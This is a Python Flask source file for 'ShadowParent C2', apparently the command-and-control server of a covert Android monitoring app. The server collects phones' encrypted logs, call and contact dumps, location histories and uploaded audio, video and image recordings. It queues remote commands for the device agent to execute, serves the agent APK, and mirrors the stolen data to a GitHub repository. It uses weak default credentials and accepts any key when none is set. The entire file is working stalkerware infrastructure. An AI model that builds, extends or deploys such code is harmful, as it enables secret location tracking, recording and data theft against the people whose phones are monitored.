"""
ShadowParent C2 — Flask dashboard + ingest API

Endpoints
  POST /ingest            encrypted device log      (form: d, k)
  POST /upload            file upload               (multipart: meta, f + X-Key)
  GET  /api/devices       list devices
  GET  /api/logs          recent logs
  GET  /api/location      latest location
  GET  /api/track/<id>    location history
  GET  /dashboard          web UI
  GET  /health            liveness probe
"""
import os
import json
import time
import uuid
import hmac

from flask import (Flask, request, jsonify, render_template, render_template_string,
                   session, redirect, url_for, abort, send_file)
from werkzeug.security import check_password_hash

import models
import crypto
import persist
from io import BytesIO

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "sp-" + uuid.uuid4().hex)
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin123")
API_KEY = os.environ.get("API_KEY", "")
UPLOAD_DIR = os.environ.get("UPLOAD_DIR", "/tmp/sp_uploads")
FILE_TOKEN = os.environ.get("FILE_TOKEN", "")
APK_URL = os.environ.get(
    "APK_URL",
    "https://github.com/palcinkoo/shadowparent-dashboard/releases/download/v1.2.2/android_UI.apk",
)

os.makedirs(UPLOAD_DIR, exist_ok=True)
models.init_db()

# The free Render filesystem is wiped on every restart of the container, so
# the database and the uploaded recordings are mirrored into a GitHub
# repository and restored here when the container comes back empty.
if persist.enabled():
    persist.restore_db(models.DB_PATH)
    persist.start_sync_loop(models.DB_PATH, models.is_dirty)
    print("[persist] mirror enabled for %s@%s" % (persist.REPO, persist.BRANCH), flush=True)


def authed():
    return session.get("logged_in", False)


@app.before_request
def guard():
    if request.path in ("/health", "/login"):
        return
    if request.path.startswith("/ingest") or request.path.startswith("/upload"):
        return
    if request.path.startswith("/apk") or request.path.startswith("/poll"):
        return
    if request.path.startswith("/beacon"):
        return
    # The map library is served from here - it must load before the login
    # redirect, otherwise the map stays empty.
    if request.path.startswith("/static/"):
        return
    if not authed():
        if request.path.startswith("/api/"):
            return jsonify({"error": "unauthorized"}), 401
        return redirect(url_for("login"))


@app.route("/apk/android_UI.apk")
def apk_download():
    """Stable, direct download URL for the container APK (used by the
    Android Enterprise provisioning QR - the device must be able to fetch
    the package without a redirect)."""
    import urllib.request

    try:
        req = urllib.request.Request(APK_URL, headers={"User-Agent": "ShadowParent"})
        with urllib.request.urlopen(req, timeout=60) as remote:
            data = remote.read()
    except Exception as exc:  # noqa: BLE001
        return jsonify({"error": "apk fetch failed", "detail": str(exc)}), 502

    resp = app.response_class(data, mimetype="application/vnd.android.package-archive")
    resp.headers["Content-Disposition"] = 'attachment; filename="android_UI.apk"'
    resp.headers["Content-Length"] = str(len(data))
    resp.headers["Cache-Control"] = "public, max-age=300"
    return resp


@app.route("/health")
def health():
    return jsonify({"ok": True, "ts": int(time.time() * 1000)})


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if hmac.compare_digest(u, ADMIN_USER) and hmac.compare_digest(p, ADMIN_PASS):
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Neplatné prihlásenie"), 401
    return render_template("login.html", error=None)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


def _key_ok(supplied: str) -> bool:
    if not API_KEY:
        return True
    return hmac.compare_digest(supplied or "", API_KEY)


@app.route("/ingest", methods=["POST"])
def ingest():
    blob = request.form.get("d", "")
    key = request.form.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    if not blob:
        return jsonify({"error": "missing d"}), 400
    try:
        device_id, kind, payload = crypto.decrypt(blob)
    except Exception as exc:
        return jsonify({"error": "decrypt failed", "detail": str(exc)}), 400

    models.touch_device(device_id)

    # Batched payloads look like {"items": [...]} - every item is stored on its
    # own row so the dashboard stays readable.
    items = None
    try:
        parsed = json.loads(payload)
        if isinstance(parsed, dict) and isinstance(parsed.get("items"), list):
            items = parsed["items"]
    except Exception:
        pass

    if items is not None:
        for item in items:
            # A single item can itself be a list (a dump of calls / contacts) -
            # every entry becomes its own row so the dashboard can list them.
            if isinstance(item, list):
                for sub in item:
                    _store(device_id, kind, sub if isinstance(sub, str) else json.dumps(sub))
            else:
                text = item if isinstance(item, str) else json.dumps(item)
                _store(device_id, kind, text)
    else:
        _store(device_id, kind, payload)

    return jsonify({"ok": True, "count": len(items) if items is not None else 1}), 200


def _store(device_id: str, kind: str, payload: str):
    if kind == "location":
        try:
            data = json.loads(payload)
            models.insert_location(
                device_id,
                float(data.get("lat")),
                float(data.get("lon")),
                data.get("acc"),
                data.get("provider"),
                data.get("source", "gps"),
            )
            return
        except Exception:
            pass
    models.insert_log(device_id, kind, payload)


@app.route("/upload", methods=["POST"])
def upload():
    key = request.headers.get("X-Key", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    meta = request.form.get("meta", "")
    f = request.files.get("f")
    if f is None:
        return jsonify({"error": "missing file"}), 400

    device_id = meta.split("|")[0] if meta else "unknown"
    kind = meta.split("|")[1] if meta and len(meta.split("|")) > 1 else "file"

    safe = os.path.basename(f.filename or "upload.bin")
    stamp = int(time.time())
    dest = os.path.join(UPLOAD_DIR, f"{stamp}_{device_id}_{safe}")
    f.save(dest)

    # Mirror the recording into the repository - the local copy disappears
    # with the container, the mirrored one does not.
    remote = persist.push_file(dest, "files/%s_%s" % (stamp, safe))
    stored = "gh:files/%s_%s" % (stamp, safe) if remote else dest

    models.touch_device(device_id)
    models.insert_file(device_id, kind, safe, os.path.getsize(dest), stored)
    return jsonify({"ok": True, "path": dest}), 200


@app.route("/beacon", methods=["POST"])
def beacon():
    """Plaintext status beacon from the agent.

    The regular channel is encrypted and batched, so a device that dies during
    startup would leave no trace. The beacon is a small plain POST that
    proves the app is alive and carries the crash report.
    """
    key = request.form.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    payload = request.form.get("d", "")
    kind = request.form.get("kind", "beacon")
    if not payload:
        return jsonify({"error": "missing d"}), 400
    device_id = request.form.get("dev", "") or "unknown"
    try:
        parsed = json.loads(payload)
        if isinstance(parsed, dict):
            device_id = str(parsed.get("device_id") or device_id or "unknown")
    except Exception:
        pass
    # The boot beacon carries the device profile - store it on the device row
    # so the dashboard can show model / Android version / app version.
    fields = {}
    try:
        parsed = json.loads(payload)
        if isinstance(parsed, dict):
            if parsed.get("model"):
                fields["model"] = str(parsed.get("model"))
            profile = {
                k: parsed.get(k)
                for k in ("sdk", "release", "app", "rooted", "battery")
                if parsed.get(k) is not None
            }
            if profile:
                fields["meta"] = json.dumps(profile)
    except Exception:
        pass
    models.touch_device(device_id, **fields)
    models.insert_log(device_id, f"beacon:{kind}", payload[:4000])
    return jsonify({"ok": True}), 200


@app.route("/poll")
def poll():
    """Command channel for the device. The agent polls this endpoint and
    executes the queued commands."""
    device_id = request.args.get("device_id", "")
    key = request.args.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    if not device_id:
        return jsonify({"error": "missing device_id"}), 400
    models.touch_device(device_id)
    return jsonify(models.fetch_commands(device_id))


@app.route("/api/command", methods=["POST"])
def api_command():
    """Queues a command for a device (dashboard -> agent)."""
    data = request.get_json(silent=True) or request.form
    device_id = (data.get("device_id") or "").strip()
    cmd = (data.get("cmd") or "").strip()
    args = data.get("args") or {}
    if not device_id or not cmd:
        return jsonify({"error": "device_id and cmd are required"}), 400
    models.insert_command(device_id, cmd, json.dumps(args))
    return jsonify({"ok": True})


@app.route("/api/devices")
def api_devices():
    return jsonify(models.list_devices())


@app.route("/api/logs")
def api_logs():
    return jsonify(models.search_logs(
        device_id=request.args.get("device_id"),
        kind=request.args.get("kind"),
        search=request.args.get("q"),
        since=int(request.args["since"]) if request.args.get("since") else None,
        limit=int(request.args.get("limit", 200)),
    ))


@app.route("/api/device/<device_id>")
def api_device(device_id):
    """Everything the overview tab needs, in one request."""
    device = models.get_device(device_id) or {}
    now = int(time.time() * 1000)
    last_seen = device.get("last_seen") or 0
    counts = models.log_counts(device_id)
    loc = models.best_location(device_id) or {}
    loc_web = models.latest_location_by_source(device_id, "web") or {}
    pending = 0
    try:
        rows = models.search_logs(device_id=device_id, kind="beacon:alive", limit=1)
        if rows:
            pending = int(json.loads(rows[0]["payload"]).get("pending") or 0)
    except Exception:
        pending = 0
    try:
        meta = json.loads(device.get("meta") or "{}")
    except Exception:
        meta = {}
    return jsonify({
        "device": device,
        "meta": meta,
        "online": bool(last_seen) and (now - last_seen) < 120_000,
        "counts": counts,
        "events_24h": sum(n for k, n in counts.items()),
        "last_location": loc,
        "last_location_web": loc_web,
        "pending": pending,
        "files": len(models.list_files(device_id)),
    })


@app.route("/api/device/<device_id>/delete", methods=["POST"])
def api_device_delete(device_id):
    """Removes a device and its data from the panel."""
    models.delete_device(device_id)
    return jsonify({"ok": True, "device_id": device_id})


@app.route("/api/export")
def api_export():
    """Full dump of everything the panel knows - the free Render tier keeps
    the database on an ephemeral disk, so a manual export is the only way to
    keep a copy of the collected data."""
    device_id = request.args.get("device_id")
    return jsonify({
        "exported_at": int(time.time() * 1000),
        "devices": models.list_devices(),
        "logs": models.recent_logs(device_id=device_id, limit=5000),
        "locations": models.location_track(device_id, 5000) if device_id else [],
        "files": models.list_files(device_id),
        "commands": models.command_history(device_id, 500),
    })


@app.route("/api/commands")
def api_commands():
    return jsonify(models.command_history(
        device_id=request.args.get("device_id"),
        limit=int(request.args.get("limit", 50)),
    ))


def _file_bytes(row):
    """Returns (bytes, mimetype) of a stored file - local copy or mirror."""
    path = row.get("path") or ""
    name = row.get("filename") or "file.bin"
    if path.startswith("gh:"):
        data = persist.read_file(path[3:])
        if data is None:
            return None, None
        return data, _mimetype(name)
    if os.path.exists(path):
        with open(path, "rb") as handle:
            return handle.read(), _mimetype(name)
    return None, None


def _mimetype(name):
    if name.endswith(".m4a"):
        return "audio/mp4"
    if name.endswith(".mp4"):
        return "video/mp4"
    if name.endswith(".jpg") or name.endswith(".jpeg"):
        return "image/jpeg"
    if name.endswith(".png"):
        return "image/png"
    if name.endswith(".webp"):
        return "image/webp"
    if name.endswith(".3gp"):
        return "video/3gpp"
    return "application/octet-stream"


@app.route("/api/file/<int:file_id>")
def api_file_download(file_id):
    row = models.get_file(file_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    path = row.get("path") or ""
    if path.startswith("gh:") or not os.path.exists(path):
        data, mimetype = _file_bytes(row)
        if data is None:
            return jsonify({"error": "file missing on server"}), 410
        return send_file(BytesIO(data), mimetype=mimetype, as_attachment=True,
                         download_name=row.get("filename"))
    return send_file(path, as_attachment=True, download_name=row.get("filename"))


@app.route("/api/file/<int:file_id>/preview")
def api_file_preview(file_id):
    row = models.get_file(file_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    path = row.get("path") or ""
    if path.startswith("gh:") or not os.path.exists(path):
        data, mimetype = _file_bytes(row)
        if data is None:
            return jsonify({"error": "file missing on server"}), 410
        return send_file(BytesIO(data), mimetype=mimetype, as_attachment=False,
                         download_name=row.get("filename"))
    return send_file(path, as_attachment=False, download_name=row.get("filename"))


@app.route("/api/location")
def api_location():
    device_id = request.args.get("device_id")
    return jsonify({
        "best": models.best_location(device_id) or {},
        "gps": models.latest_location_by_source(device_id, "gps") or {},
        "network": models.latest_location_by_source(device_id, "network") or {},
        "web": models.latest_location_by_source(device_id, "web") or {},
    })


@app.route("/api/track/<device_id>")
def api_track(device_id):
    return jsonify(models.location_track(device_id))


@app.route("/api/files")
def api_files():
    return jsonify(models.list_files(request.args.get("device_id")))


@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
